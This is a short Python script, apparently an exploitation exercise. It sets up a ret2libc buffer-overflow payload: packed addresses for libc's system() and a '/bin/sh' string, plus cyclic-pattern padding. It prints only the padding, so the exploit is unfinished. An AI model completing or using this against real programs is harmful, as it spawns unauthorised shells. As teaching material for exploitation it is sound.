import struct


system =struct.pack("Q",0x7ffff7e19fd0)
sh=struct.pack("Q", 0x7ffff7f76b84)

##Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0
PAD="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0AAAAAAA"
print PAD
